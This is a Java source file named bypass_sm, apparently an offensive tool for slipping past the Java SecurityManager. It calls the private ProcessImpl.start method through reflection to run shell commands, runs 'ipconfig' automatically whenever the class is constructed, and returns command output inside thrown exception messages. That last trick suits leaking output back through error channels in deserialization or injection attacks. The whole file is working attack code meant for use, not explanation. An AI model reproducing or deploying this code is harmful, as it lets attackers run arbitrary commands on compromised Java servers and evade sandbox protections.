import java.io.*;
import java.lang.reflect.Method;
import java.util.Map;

public class bypass_sm
{
    public bypass_sm() {
        try {
            bypass(new String[]{"ipconfig"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void bypass(String[] cmd) throws Exception{
        Map<String,String> envblock=null;
        String path=null;
        ProcessBuilder.Redirect[] stdHandles=null;
        boolean redirectErrorStream=true;

        Class C = Class.forName("java.lang.ProcessImpl");
        Method start = C.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);
        Process e =  (Process) start.invoke(null, cmd, envblock, path, stdHandles, redirectErrorStream);

        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(e.getInputStream()));
        String line;
        while ((line=bufferedReader.readLine())!=null){
            System.out.println(line);
        }
        bufferedReader.close();
    }


    public static Process ProcessImpl(String[] cmd)throws Exception{
        Map<String,String> envblock=null;
        String path=null;
        ProcessBuilder.Redirect[] stdHandles=null;
        boolean redirectErrorStream=true;

        Class C = Class.forName("java.lang.ProcessImpl");
        Method start = C.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);
        Process e =  (Process) start.invoke(null, cmd, envblock, path, stdHandles, redirectErrorStream);
        return e;
    }


    public static byte[] readBytes(InputStream in)
            throws IOException
    {
        BufferedInputStream bufin = new BufferedInputStream(in);
        int buffSize = 1024;
        ByteArrayOutputStream out = new ByteArrayOutputStream(buffSize);
        byte[] temp = new byte[buffSize];
        int size = 0;
        while ((size = bufin.read(temp)) != -1) {
            out.write(temp, 0, size);
        }
        bufin.close();

        byte[] content = out.toByteArray();

        return content;
    }

    public static void do_exec(String[] cmd)
            throws Exception
    {
        Process p = ProcessImpl(cmd);

        byte[] stderr = readBytes(p.getErrorStream());
        byte[] stdout = readBytes(p.getInputStream());
        int exitValue = p.waitFor();
        if (exitValue == 0) {
            throw new Exception("-----------------\r\n" + new String(stdout) + "-----------------\r\n");
        }
        throw new Exception("-----------------\r\n" + new String(stderr) + "-----------------\r\n");
    }

    public static void main(String[] args)
            throws Exception
    {
        do_exec(new String[]{args[0]});
    }
}
